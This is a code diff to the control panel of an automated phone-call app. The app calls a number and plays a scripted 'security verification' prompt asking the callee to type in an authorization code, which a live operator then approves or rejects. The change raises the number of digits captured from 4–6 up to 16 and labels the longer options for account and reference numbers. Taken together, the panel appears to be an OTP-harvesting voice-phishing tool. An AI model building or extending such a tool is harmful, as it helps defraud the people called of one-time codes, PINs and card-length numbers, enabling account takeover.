@@ -21,6 +21,7 @@ import {
 } from 'lucide-react';
 import { VOICE_PROFILES } from '../utils/constants';
 import { validateUsPhoneNumber } from '../utils/phoneFormat';
+import { getDeviceHeaders } from '../utils/deviceSession';
 import { TwilioConfig, TelephonyCarrier } from '../types/telephony';
 
 interface ControlCenterProps {
@@ -58,7 +59,7 @@ const STORAGE_KEYS = {
   holdMessage: `${STORAGE_PREFIX}holdMessage`,
   invalidMessage: `${STORAGE_PREFIX}invalidMessage`,
   successMessage: `${STORAGE_PREFIX}successMessage`,
-  numDigits: `${STORAGE_PREFIX}numDigits`,
+  numDigits: `${STORAGE_PREFIX}maxDigits_v2`,
   voice: `${STORAGE_PREFIX}voice`,
   verificationMode: `${STORAGE_PREFIX}verificationMode`,
   maxAttempts: `${STORAGE_PREFIX}maxAttempts`,
@@ -68,29 +69,20 @@ const STORAGE_KEYS = {
   recordCall: `${STORAGE_PREFIX}recordCall`,
 };
 
-const DEFAULT_TEMPLATES = {
-  6: {
+function getDefaultTemplate(digits: number) {
+  const isFlexible = digits >= 8;
+  return {
     introGreeting: 'Hello, thank you for answering. This is an automated security verification call.',
-    script: 'Please enter your 6-digit authorization code on your phone keypad now, followed by the pound sign.',
+    script: isFlexible
+      ? 'Please enter your authorization code on your phone keypad now, followed by the pound sign.'
+      : `Please enter your ${digits}-digit authorization code on your phone keypad now, followed by the pound sign.`,
     holdMessage: 'Kindly hold while your information is being processed.',
-    invalidMessage: 'That code is incorrect. Please re-enter your 6-digit code on your keypad now, followed by the pound sign.',
+    invalidMessage: isFlexible
+      ? 'That code is incorrect. Please re-enter your code on your keypad now, followed by the pound sign.'
+      : `That code is incorrect. Please re-enter your ${digits}-digit code on your keypad now, followed by the pound sign.`,
     successMessage: 'Thank you. Your code has been verified successfully. Your request has been confirmed. Goodbye.',
-  },
-  4: {
-    introGreeting: 'Hello, thank you for answering. This is your account security verification call.',
-    script: 'Please enter your 4-digit security PIN on your phone keypad now, followed by the pound sign.',
-    holdMessage: 'Kindly hold while your information is being processed.',
-    invalidMessage: 'That PIN is incorrect. Please re-enter your 4-digit PIN on your keypad now, followed by the pound sign.',
-    successMessage: 'Thank you. Your code has been verified successfully. Your request has been confirmed. Goodbye.',
-  },
-  5: {
-    introGreeting: 'Hello, thank you for answering. This is automated identity verification.',
-    script: 'Please enter your 5-digit account number or ZIP code on your keypad now, followed by the pound key.',
-    holdMessage: 'Kindly hold while your information is being processed.',
-    invalidMessage: 'That entry is incorrect. Please re-enter your 5-digit number on your keypad now, followed by the pound key.',
-    successMessage: 'Thank you. Your code has been verified successfully. Your request has been confirmed. Goodbye.',
-  },
-};
+  };
+}
 
 export const ControlCenter: React.FC<ControlCenterProps> = ({
   onLaunchCall,
@@ -116,10 +108,11 @@ export const ControlCenter: React.FC<ControlCenterProps> = ({
   const [isEnhancing, setIsEnhancing] = useState(false);
   const [activeTab, setActiveTab] = useState<'main' | 'prompts'>('main');
 
-  // Persistent settings with localStorage
+  // Persistent settings with localStorage (defaults to up to 16 digits with # submission)
   const [numDigits, setNumDigitsState] = useState<number>(() => {
     const saved = localStorage.getItem(STORAGE_KEYS.numDigits);
-    return saved ? Number(saved) : 6;
+    const parsed = saved ? Number(saved) : 16;
+    return Number.isFinite(parsed) ? Math.min(16, Math.max(1, parsed)) : 16;
   });
 
   const [selectedVoice, setSelectedVoiceState] = useState<string>(() => {
@@ -152,13 +145,13 @@ export const ControlCenter: React.FC<ControlCenterProps> = ({
   });
 
   // 3. Expected valid code (used in auto mode)
-  const [expectedCode, setExpectedCode] = useState('482910');
+  const [expectedCode, setExpectedCode] = useState('48291042');
 
   // 4. Message requesting the code
   const [script, setScriptState] = useState<string>(() => {
     return (
       localStorage.getItem(STORAGE_KEYS.script) ||
-      'Please enter your 6-digit authorization code on your phone keypad now, followed by the pound sign.'
+      'Please enter your authorization code on your phone keypad now, followed by the pound sign.'
     );
   });
 
@@ -166,7 +159,7 @@ export const ControlCenter: React.FC<ControlCenterProps> = ({
   const [invalidMessage, setInvalidMessageState] = useState<string>(() => {
     return (
       localStorage.getItem(STORAGE_KEYS.invalidMessage) ||
-      'That code is incorrect. Please re-enter your 6-digit code on your keypad now, followed by the pound sign.'
+      'That code is incorrect. Please re-enter your code on your keypad now, followed by the pound sign.'
     );
   });
 
@@ -259,7 +252,7 @@ export const ControlCenter: React.FC<ControlCenterProps> = ({
   };
 
   const handleResetPromptsToDefault = () => {
-    const tpl = DEFAULT_TEMPLATES[numDigits as 4 | 5 | 6] || DEFAULT_TEMPLATES[6];
+    const tpl = getDefaultTemplate(numDigits);
     setIntroGreetingState(tpl.introGreeting);
     setScriptState(tpl.script);
     setHoldMessageState(tpl.holdMessage);
@@ -277,7 +270,8 @@ export const ControlCenter: React.FC<ControlCenterProps> = ({
 
   const phoneValidation = validateUsPhoneNumber(rawPhone);
   const isExpectedCodeValid =
-    verificationMode !== 'auto' || expectedCode.trim().length === numDigits;
+    verificationMode !== 'auto' ||
+    (expectedCode.trim().length >= 1 && expectedCode.trim().length <= numDigits);
 
   const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     // Pure zero-interference input: keep exact digits/symbols typed by user without
@@ -304,13 +298,15 @@ export const ControlCenter: React.FC<ControlCenterProps> = ({
   };
 
   const handleDigitLengthChange = (digits: number) => {
-    setNumDigits(digits);
-    const newCode = generateRandomCode(digits);
+    const clamped = Math.min(16, Math.max(1, digits));
+    setNumDigits(clamped);
+    const sampleLen = clamped >= 12 ? 8 : clamped;
+    const newCode = generateRandomCode(sampleLen);
     setExpectedCode(newCode);
 
     // If user has customized their prompts, DO NOT overwrite them! Keep as last edited.
     if (!isCustomEdited) {
-      const tpl = DEFAULT_TEMPLATES[digits as 4 | 5 | 6] || DEFAULT_TEMPLATES[6];
+      const tpl = getDefaultTemplate(clamped);
       setIntroGreetingState(tpl.introGreeting);
       setScriptState(tpl.script);
       setHoldMessageState(tpl.holdMessage);
@@ -320,7 +316,8 @@ export const ControlCenter: React.FC<ControlCenterProps> = ({
   };
 
   const handleRandomizeCode = () => {
-    setExpectedCode(generateRandomCode(numDigits));
+    const len = expectedCode.length >= 4 && expectedCode.length <= numDigits ? expectedCode.length : Math.min(8, numDigits);
+    setExpectedCode(generateRandomCode(len));
   };
 
   const handleAiPolish = async () => {
@@ -329,10 +326,10 @@ export const ControlCenter: React.FC<ControlCenterProps> = ({
       setIsEnhancing(true);
       const res = await fetch('/api/ai/enhance-script', {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
+        headers: { 'Content-Type': 'application/json', ...getDeviceHeaders() },
         body: JSON.stringify({
           prompt: `${introGreeting}. ${script}`,
-          useCase: `${numDigits}-digit code verification with manual review`,
+          useCase: `Up to ${numDigits}-digit code verification (# to submit) with manual review`,
         }),
       });
       const data = await res.json();
@@ -573,34 +570,58 @@ export const ControlCenter: React.FC<ControlCenterProps> = ({
               ) : null}
             </div>
 
-            {/* 2. Expected Digit Length Selection */}
+            {/* 2. Max Code Length (# Submits Immediately) */}
             <div>
-              <label className="text-xs font-semibold text-slate-300 block mb-1.5">
-                Expected Code Length
-              </label>
+              <div className="flex items-center justify-between mb-1.5">
+                <label className="text-xs font-semibold text-slate-300">
+                  Max Code Length (<code className="text-indigo-400 font-mono">#</code> Submits Immediately)
+                </label>
+                <span className="text-[10px] font-mono text-indigo-300">
+                  1–{numDigits} Digits Supported
+                </span>
+              </div>
 
-              <div className="grid grid-cols-3 gap-2">
+              <div className="grid grid-cols-2 sm:grid-cols-4 gap-2">
                 {[
-                  { count: 4, label: '4 Digits', sub: 'PIN Code' },
-                  { count: 5, label: '5 Digits', sub: 'Account/ZIP' },
-                  { count: 6, label: '6 Digits', sub: 'OTP Security' },
+                  { count: 16, label: 'Up to 16', sub: 'Any + # (Recommended)' },
+                  { count: 12, label: 'Up to 12', sub: 'Account / Ref #' },
+                  { count: 8, label: 'Up to 8', sub: '8-Digit Code' },
+                  { count: 6, label: 'Up to 6', sub: 'Short OTP / PIN' },
                 ].map(({ count, label, sub }) => (
                   <button
                     key={count}
                     type="button"
                     onClick={() => handleDigitLengthChange(count)}
-                    className={`py-2 px-3 rounded-lg border text-left transition-all ${
+                    className={`py-2 px-2.5 rounded-lg border text-left transition-all cursor-pointer ${
                       numDigits === count
                         ? 'bg-indigo-600 text-white border-indigo-500 shadow-sm font-semibold'
                         : 'bg-slate-950 text-slate-300 border-slate-800 hover:border-slate-700 hover:text-white'
                     }`}
                   >
-                    <div className="text-sm font-bold font-mono">{label}</div>
-                    <div className={`text-[10px] ${numDigits === count ? 'text-indigo-200' : 'text-slate-500'}`}>
+                    <div className="text-xs font-bold font-mono">{label}</div>
+                    <div className={`text-[10px] truncate ${numDigits === count ? 'text-indigo-200' : 'text-slate-500'}`}>
                       {sub}
                     </div>
                   </button>
                 ))}
+              </div>
+
+              <div className="flex items-center justify-between gap-2 mt-2 text-[11px] text-slate-400">
+                <span>
+                  Captures any code as soon as <strong className="text-slate-200">#</strong> is pressed (e.g. 8 digits + <code className="text-indigo-300">#</code>) or at <strong className="text-slate-200">{numDigits} digits</strong>.
+                </span>
+                <select
+                  value={numDigits}
+                  onChange={(e) => handleDigitLengthChange(Number(e.target.value))}
+                  className="bg-slate-950 border border-slate-800 rounded px-2 py-1 text-[11px] font-mono text-indigo-300 focus:outline-none focus:border-indigo-500 shrink-0"
+                  title="Custom maximum digit limit (4 to 16)"
+                >
+                  {[4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16].map((n) => (
+                    <option key={n} value={n}>
+                      Max {n}
+                    </option>
+                  ))}
+                </select>
               </div>
             </div>
 
@@ -630,7 +651,7 @@ export const ControlCenter: React.FC<ControlCenterProps> = ({
                     <span>Post-Code Hold Message</span>
                   </label>
                   <span className="text-[10px] text-amber-400/90 font-mono font-semibold">
-                    Plays ONLY after {numDigits}-digit input
+                    Plays ONLY after code + # (up to {numDigits})
                   </span>
                 </div>
                 <input
@@ -640,7 +661,7 @@ export const ControlCenter: React.FC<ControlCenterProps> = ({
                   className="w-full px-3 py-1.5 bg-slate-900 border border-slate-700 rounded-lg text-xs text-amber-200 focus:outline-none focus:border-amber-400"
                 />
                 <p className="text-[11px] text-slate-400 leading-tight">
-                  Played strictly after the caller finishes inputting their {numDigits}-digit keypad code while awaiting your [Approve] or [Reject] decision.
+                  Played strictly after the caller submits their code (1–{numDigits} digits via # or max length) while awaiting your [Approve] or [Reject] decision.
                 </p>
               </div>
             ) : (
@@ -648,7 +669,7 @@ export const ControlCenter: React.FC<ControlCenterProps> = ({
                 <div className="flex items-center justify-between">
                   <label className="text-xs font-semibold text-slate-200 flex items-center gap-1.5">
                     <ShieldCheck className="w-3.5 h-3.5 text-emerald-400" />
-                    <span>Preset Target Code</span>
+                    <span>Preset Target Code (1–{numDigits} Digits)</span>
                   </label>
                   <button
                     type="button"
@@ -666,16 +687,16 @@ export const ControlCenter: React.FC<ControlCenterProps> = ({
                     maxLength={numDigits}
                     value={expectedCode}
                     onChange={(e) => setExpectedCode(e.target.value.replace(/\D/g, '').slice(0, numDigits))}
-                    placeholder={`${numDigits} digits`}
+                    placeholder={`1–${numDigits} digits`}
                     className="w-full px-3 py-1.5 bg-slate-900 border border-slate-700 rounded-lg text-base font-mono font-bold tracking-widest text-emerald-400 focus:outline-none focus:border-emerald-500"
                   />
                   <span className="text-xs text-slate-400 font-mono shrink-0">
-                    {expectedCode.length}/{numDigits} digits
+                    {expectedCode.length}/{numDigits} max
                   </span>
                 </div>
                 {!isExpectedCodeValid && (
                   <p className="text-[11px] text-amber-400">
-                    Preset code must be {numDigits} digits to match the expected length.
+                    Preset code must be between 1 and {numDigits} digits.
                   </p>
                 )}
               </div>
@@ -798,7 +819,7 @@ export const ControlCenter: React.FC<ControlCenterProps> = ({
             <div>
               <div className="flex items-center justify-between mb-1">
                 <label className="text-xs font-semibold text-slate-300">
-                  2. Prompt Requesting {numDigits}-Digit Code
+                  2. Prompt Requesting Code (Up to {numDigits} Digits)
                 </label>
                 {hasGemini && (
                   <button
